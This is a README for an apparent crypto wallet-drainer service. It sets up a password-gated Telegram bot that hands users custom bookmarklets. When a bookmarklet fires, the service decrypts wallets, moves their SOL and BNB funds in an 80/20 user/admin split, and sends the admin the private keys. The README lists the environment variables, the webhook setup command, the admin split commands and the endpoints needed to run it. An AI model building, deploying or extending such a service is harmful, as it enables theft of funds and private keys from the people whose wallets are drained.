# bookmarklet-receiver v3

Password-gated multi-user Telegram bot + on-chain split receiver.

## What users do

1. Message the bot → `/start`
2. Bot asks for **access password** (`BOT_ACCESS_PASSWORD`)
3. User sends the password → unlocked
4. Bot asks for their **public SOL address** (where their share is sent)
5. Bot asks for their **public BNB address**
6. Bot gives them a **private token + custom bookmarklet** + buttons

When their bookmarklet fires:

- wallets are decrypted
- **admin %** is transferred to `ADMIN_SOL_ADDRESS` / `ADMIN_BNB_ADDRESS`
- **user %** is transferred to **that user’s** public addresses
- user gets a balance message (no keys)
- **admin gets full logs + private keys + transfer txids**

Default split: **80% user / 20% admin**. Admin changes it with `/setsplit`.

## Env vars

### Required

| Variable | Purpose |
|----------|---------|
| `TELEGRAM_BOT_TOKEN` | From @BotFather |
| `BOT_ACCESS_PASSWORD` | Shared password users must send to unlock the bot |
| `ADMIN_CHAT_IDS` | Your Telegram id(s). Gets keys + can run admin commands |
| `ADMIN_SOL_ADDRESS` | Solana address that receives admin % |
| `ADMIN_BNB_ADDRESS` | BSC address that receives admin % |
| `BASE_URL` | `https://your-app.vercel.app` |

### Optional

| Variable | Purpose |
|----------|---------|
| `REGISTER_KEY` | Locks HTTP `/api/register` + `/api/users` (bot does not need this) |
| `DEFAULT_USER_PERCENT` | Default user share (default `80`) |
| `USERS_JSON` | Durable user map for multi-instance |
| `SOLANA_RPC` / `BSC_RPC` | Custom RPCs |
| `FALLBACK_CHAT_ID` | Only if token missing |

### Minimal paste for Vercel

```
TELEGRAM_BOT_TOKEN=123456:ABC...
BOT_ACCESS_PASSWORD=the-password-you-give-people
ADMIN_CHAT_IDS=987654321
ADMIN_SOL_ADDRESS=YourSolAddress
ADMIN_BNB_ADDRESS=0xYourBscAddress
BASE_URL=https://your-app.vercel.app
```

## After deploy

```bash
curl "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/setWebhook" \
  -d "url=https://your-app.vercel.app/api/bot/webhook"
```

## Admin bot commands

Only `ADMIN_CHAT_IDS`:

```
/setsplit <token|chatId> <userPercent>
/getsplit <token|chatId>
/list
```

## User bot commands / buttons

```
/start   – begin / resume setup
/status  – show token, wallets, split
/help
```

Inline buttons after setup:

- My token
- Bookmarklet
- My wallets
- My split
- Reset payout addresses

## Endpoints

| Method | Path | Purpose |
|--------|------|---------|
| POST | `/api/bot/webhook` | Telegram updates |
| GET | `/data/:slug` | Bookmarklet hit → decrypt → split → telegram |
| POST | `/api/register` | Optional HTTP register (needs `REGISTER_KEY`) |
| GET | `/api/users` | Optional list (needs `REGISTER_KEY`) |

## Notes

- `REGISTER_KEY` is **not** the bot password. The bot password is `BOT_ACCESS_PASSWORD`.
- Users never receive private keys. Only admin chat ids do.
- If a user has not set a payout address, their % is left in the source wallet.
- Dust and fee residuals are skipped so accounts do not brick.
